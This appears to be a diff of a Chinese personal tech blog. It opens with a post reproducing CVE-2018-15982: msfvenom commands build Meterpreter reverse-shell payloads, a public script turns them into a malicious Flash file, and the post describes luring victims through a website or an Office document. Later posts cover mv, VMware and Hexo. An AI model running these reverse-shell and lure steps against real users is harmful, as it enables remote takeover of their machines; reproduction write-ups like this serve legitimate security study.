+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
+<p>复现环境：靶机：Windows 7 SP1 32位 攻击机：Kali-LInux 2019</p>
+</blockquote>
+<h4 id="01-生成恶意样本"><a href="#01-生成恶意样本" class="headerlink" title="01 生成恶意样本"></a>01 生成恶意样本</h4><blockquote>
+<p>生成meterpreter反弹payload</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f raw &gt; 86.bin </span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f raw &gt; 64.bin</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>使用payload生成exploit文件</p>
+</blockquote>
+<p><a href="脚本CVE_2018_15982.py的github地址">https://github.com/Ridter/CVE-2018-15982_EXP</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CVE_2018_15982.py -i <span class="number">86.</span>bin -I <span class="number">64.</span>bin</span><br><span class="line"><span class="comment"># output: exploit.swf（恶意样本文件）, index.html（实际没什么用）</span></span><br></pre></td></tr></table></figure>
+<p>生成了恶意样本之后，如何让受害者访问到恶意样本呢？我们采取了两种方式：第一种是将恶意样本放到网站上；第二种是将恶意样本嵌入到文档中。</p>
+<h4 id="02-将恶意样本放到网站上"><a href="#02-将恶意样本放到网站上" class="headerlink" title="02 将恶意样本放到网站上"></a>02 将恶意样本放到网站上</h4><p>将exploit.swf文件放到网站下，诱导用户访问网站，如果用户调用了包含漏洞的Adobe Flash Player来打开该文件，就会受到攻击。</p>
+<h4 id="03-将恶意样本嵌入文档中"><a href="#03-将恶意样本嵌入文档中" class="headerlink" title="03 将恶意样本嵌入文档中"></a>03 将恶意样本嵌入文档中</h4><p>将exploit.swf文件嵌入到文档中，诱导用户打开并加载。<br>Word/ Excel / PowerPoint -&gt; 开发工具 -&gt; 添加其他控件 -&gt; Shockwave Flash Object -&gt; 设计模式 -&gt; 属性 -&gt; movie</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/mv命令/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/07/mv命令/" class="post-title-link" itemprop="url">mv命令</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-07-07 22:22:33" itemprop="dateCreated datePublished" datetime="2019-07-07T22:22:33+08:00">2019-07-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-07-08 19:12:30" itemprop="dateModified" datetime="2019-07-08T19:12:30+08:00">2019-07-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>mv命令用于为移动文件/目录和重命名文件/目录</p>
+</blockquote>
+<h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>将路径分为<code>path</code>和<code>filename</code>（包含目录）两部分，包含<code>path</code>和<code>filename</code>的写法称为完整路径，而省略了<code>filename</code>的写法称为不完整路径，即：<br><strong>完整路径：</strong><code>path/filename</code><br><strong>不完整路径：</strong><code>path</code></p>
+<h3 id="在介绍这个命令的两种用法之前，首先强调三点理解："><a href="#在介绍这个命令的两种用法之前，首先强调三点理解：" class="headerlink" title="在介绍这个命令的两种用法之前，首先强调三点理解："></a>在介绍这个命令的两种用法之前，首先强调三点理解：</h3><ol>
+<li>目录本质上是特殊的文件，所以大部分时候处理方法和文件一致，无需特别区分。</li>
+<li>移动文件/目录和重命名文件/目录本质上都是改变文件的路径，无需特别区分。</li>
+<li>处理优先级：首先尽量认为target是完整路径，先尽量无冲突修改路径，然后考虑覆盖；上面两种情况都不可行的情况下认为target是不完整路径，构造新的完整路径，同样先尽量无冲突修改路径，然后考虑覆盖；如果上面的情况都不行，只能修改失败退出。</li>
+</ol>
+<h3 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: mv <span class="built_in">source</span> target</span><br></pre></td></tr></table></figure>
+<h3 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h3><ol>
+<li>检查源路径是否存在，不存在报错并退出；</li>
+<li>首先认为目标路径是完整路径，首先检查<code>path</code>部分，如果该完整路径的<code>path</code>部分不存在，报错并退出；</li>
+<li>然后检查<code>filename</code>部分，如果不存在，直接修改路径，命令执行成功，如果存在，继续判断；<ol>
+<li>完整路径<code>path/filename</code>是文件，如果源路径是文件，则覆盖，如果是文件夹，则报错并退出。</li>
+<li>完整路径<code>path/filename</code>是目录，认为目标路径是不完整路径，即将原来的路径看作新的<code>path</code>，将源文件/目录名看作是<code>filename</code>，重新拼接成完整路径<code>path/filename</code>。新的完整路径如果不存在冲突，直接修改路径，命令执行成功；如果存在冲突，尝试覆盖，目录不能覆盖文件，文件不能覆盖目录，目录不能覆盖非空目录，文件可以覆盖文件。</li>
+</ol>
+</li>
+</ol>
+<h3 id="进阶用法："><a href="#进阶用法：" class="headerlink" title="进阶用法："></a>进阶用法：</h3><ol>
+<li>批量移动文件<ol>
+<li>正则表达式匹配 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv <span class="built_in">test</span>* ../<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+<ol start="2">
+<li>选项</li>
+<li>是否可能导致文件丢失？</li>
+</ol>
+<ol>
+<li>如何区分移动文件和重命名</li>
+<li>如何区分移动文件和目录</li>
+<li>如何区分是否递归移动目录 可能默认就是递归的，不是递归的情况感觉怪怪的</li>
+<li>如果移动的文件正在读写，会出现什么情况。</li>
+<li>如果命令出错后果是什么，会导致文件丢失吗？ 文件名重复、路径不存在、mv命令是如何实现的呢</li>
+<li>想象自己就是计算机，需要判断上面的这些问题，我需要哪些信息呢？</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/解决VMware虚拟机“安装VMware-Tools”选项卡为灰色的问题/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/07/解决VMware虚拟机“安装VMware-Tools”选项卡为灰色的问题/" class="post-title-link" itemprop="url">解决VMware虚拟机“安装VMware Tools”选项卡为灰色的问题</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-07-07 22:09:42" itemprop="dateCreated datePublished" datetime="2019-07-07T22:09:42+08:00">2019-07-07</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li>虚拟机设置 -&gt; 硬件 -&gt; CD/DVD驱动器 -&gt; 连接 -&gt; 使用物理驱动器。</li>
+<li>现在“安装VMware Tools”选项卡就恢复正常可以安装了。</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/宿主机和VMware虚拟机之间互传文件的方法/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/07/宿主机和VMware虚拟机之间互传文件的方法/" class="post-title-link" itemprop="url">宿主机和VMware虚拟机之间互传文件的方法</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-07-07 22:04:54" itemprop="dateCreated datePublished" datetime="2019-07-07T22:04:54+08:00">2019-07-07</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li>VMware tools</li>
+<li>搭建WEB服务器</li>
+<li>搭建ftp服务器</li>
+<li>搭建ssh服务 winscp xftp</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -330,14 +1423,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-07-06 20:59:50 / Geändert am: 21:09:38" itemprop="dateCreated datePublished" datetime="2019-07-06T20:59:50+08:00">2019-07-06</time>
+              <time title="Post created: 2019-07-06 20:59:50 / Updated at: 21:09:38" itemprop="dateCreated datePublished" datetime="2019-07-06T20:59:50+08:00">2019-07-06</time>
             
 
             
@@ -356,7 +1449,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
@@ -504,14 +1597,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-07-06 19:52:48 / Geändert am: 21:12:39" itemprop="dateCreated datePublished" datetime="2019-07-06T19:52:48+08:00">2019-07-06</time>
+              <time title="Post created: 2019-07-06 19:52:48 / Updated at: 21:12:39" itemprop="dateCreated datePublished" datetime="2019-07-06T19:52:48+08:00">2019-07-06</time>
             
 
             
@@ -530,7 +1623,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a></span>
@@ -693,14 +1786,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-07-06 11:00:59" itemprop="dateCreated datePublished" datetime="2019-07-06T11:00:59+08:00">2019-07-06</time>
+              <time title="Post created: 2019-07-06 11:00:59" itemprop="dateCreated datePublished" datetime="2019-07-06T11:00:59+08:00">2019-07-06</time>
             
 
             
@@ -715,9 +1808,9 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2019-07-08 19:59:38" itemprop="dateModified" datetime="2019-07-08T19:59:38+08:00">2019-07-08</time>
+                <time title="Updated at: 2019-07-08 19:59:38" itemprop="dateModified" datetime="2019-07-08T19:59:38+08:00">2019-07-08</time>
               
             
           </span>
@@ -731,7 +1824,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
@@ -882,14 +1975,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-05-30 23:29:40 / Geändert am: 23:31:55" itemprop="dateCreated datePublished" datetime="2019-05-30T23:29:40+08:00">2019-05-30</time>
+              <time title="Post created: 2019-05-30 23:29:40 / Updated at: 23:31:55" itemprop="dateCreated datePublished" datetime="2019-05-30T23:29:40+08:00">2019-05-30</time>
             
 
             
@@ -908,7 +2001,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/论文阅读/" itemprop="url" rel="index"><span itemprop="name">论文阅读</span></a></span>
@@ -998,1098 +2091,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/26/强网杯2019-wp/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/26/强网杯2019-wp/" class="post-title-link" itemprop="url">强网杯2019-wp</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-05-26 22:02:02" itemprop="dateCreated datePublished" datetime="2019-05-26T22:02:02+08:00">2019-05-26</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-08-06 21:59:17" itemprop="dateModified" datetime="2019-08-06T21:59:17+08:00">2019-08-06</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋_AD"></a>强网先锋_AD</h3><p>用IDA分析：<br>查看字符串猜测是base64：<br><img src="/images/2019/05/26/fee95890-7fbe-11e9-832a-3b016e9f5980.png" alt="image.png"><br>分析main函数，v5到v40就是一串字符串base64编码后的结果：<br><img src="/images/2019/05/26/40680230-7fbf-11e9-832a-3b016e9f5980.png" alt="image.png"><br>解码得到flag：flag{mafakuailaiqiandaob}</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/14/hexo-草稿功能/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/14/hexo-草稿功能/" class="post-title-link" itemprop="url">hexo -- 草稿功能</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-05-14 20:34:46" itemprop="dateCreated datePublished" datetime="2019-05-14T20:34:46+08:00">2019-05-14</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-26 12:57:11" itemprop="dateModified" datetime="2019-05-26T12:57:11+08:00">2019-05-26</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>草稿相当于很多博客都有的“私密文章”功能。使用如下命令创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft &quot;new draft&quot;</span><br></pre></td></tr></table></figure></p>
-<p>会在source/_drafts目录下生成一个new-draft.md文件。但是这个文件不被显示在页面上，链接也访问不到。<strong>也就是说如果你想把某一篇文章移除显示，又不舍得删除，可以把它移动到_drafts目录之中。
-</strong><br>如果你希望强行预览草稿，更改配置文件（_config.yml）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_drafts: true</span><br></pre></td></tr></table></figure></p>
-<p><strong>或者</strong>如下方式启动server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo server --drafts</span><br><span class="line">或</span><br><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/About-Me/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/22/About-Me/" class="post-title-link" itemprop="url">About Me</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-22 21:34:05" itemprop="dateCreated datePublished" datetime="2019-04-22T21:34:05+08:00">2019-04-22</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-12 11:46:18" itemprop="dateModified" datetime="2019-05-12T11:46:18+08:00">2019-05-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/随笔-日记/" itemprop="url" rel="index"><span itemprop="name">随笔&日记</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>我的github：<br><a href="https://github.com/xunightmare" target="_blank" rel="noopener">https://github.com/xunightmare</a></p>
-<p>我的邮箱：<br><a href="mailto:549761281@qq.com" target="_blank" rel="noopener">549761281@qq.com</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/Reversing-Kr-Easy-Crack-Writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xnightmare">
-      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xnightmare's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/22/Reversing-Kr-Easy-Crack-Writeup/" class="post-title-link" itemprop="url">Reversing.Kr -- Easy Crack Writeup</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-22 20:51:13" itemprop="dateCreated datePublished" datetime="2019-04-22T20:51:13+08:00">2019-04-22</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-12 11:49:00" itemprop="dateModified" datetime="2019-05-12T11:49:00+08:00">2019-05-12</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
